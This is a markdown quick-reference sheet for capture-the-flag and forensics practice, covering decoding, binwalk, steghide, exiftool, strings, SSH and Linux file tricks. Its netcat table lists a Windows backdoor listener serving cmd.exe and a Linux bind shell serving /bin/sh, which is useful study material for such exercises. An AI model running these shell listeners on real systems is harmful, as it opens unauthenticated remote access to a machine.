---

# 🛠️ CTF & Forensics Quick Reference

A structured guide for binary analysis, steganography, and network exploitation.

---

## 🔐 1. Encoding & Ciphers

| Tool | Usage | Command |
| --- | --- | --- |
| **Base64** | Decode strings | `base64 -d file.txt` |
| **ROT13** | Rotate characters | `cat file | tr 'A-Za-z' 'N-ZA-Mn-za-m'` |
| **Brainfuck** | Esoteric code | [Decode via dCode](https://www.dcode.fr/brainfuck-language) |

> **Note:** For Base64, you can echo and decode in one line:
> `echo "STRING==" | base64 -d`

---

## 🔍 2. File Analysis & Forensics

### **Binary & Firmware**

* **Binwalk**: Identify and extract hidden files inside binaries.
```bash
binwalk file.bin       # Scan
binwalk -e file.bin    # Extract

```



### **Steganography**

* **Steghide**: Extract data from images/audio using a passphrase.
```bash
steghide extract -sf image.jpg

```


* **Stegsolve**: Use the GUI to check color planes (Alpha, LSB, etc.).
```bash
java -jar stegsolve.jar

```



### **Metadata & Strings**

* **Exiftool**: View image metadata (GPS, Author, Software).
```bash
exiftool image.jpg

```


* **Strings**: Find human-readable text (flags) in binary files.
```bash
strings file | grep -i "thm{"

```



---

## 🌐 3. Networking & Remote Access

### **Netcat (The Swiss Army Knife)**

| Mode | Action | Command |
| --- | --- | --- |
| **Backdoor (Win)** | Listen + Cmd | `nc -L -p 4444 -d -e cmd.exe` |
| **Bind Shell (Lnx)** | Listen + Bash | `nc -l -p 1234 -e /bin/sh` |
| **Connect** | Connect to IP | `nc [IP_ADDR] [PORT]` |

### **Encrypted Connections**

* **OpenSSL**: For SSL/TLS encrypted ports.
```bash
openssl s_client -connect localhost:443

```


* **SSH**: Connection using a private key file.
```bash
ssh -i sshkey.private user@host -p 2220

```



---

## 🐧 4. Linux Power User Tips

### **File System Operations**

* **Edge Case Files**: Opening a file named exactly "`-`":
```bash
cat ./-

```


* **Disk Usage**: Search for files of a specific size (e.g., 1033 bytes):
```bash
du -b -a | grep 1033

```



### **Decompression**

* **.bz2**: `bunzip2 file.bz2`
* **.gz**: `gunzip file.gz`

### **Data Cleaning**

* **Unique Lines**: Find the only line that doesn't repeat (common for "find the needle" tasks).
```bash
cat data.txt | sort | uniq -u

```



---

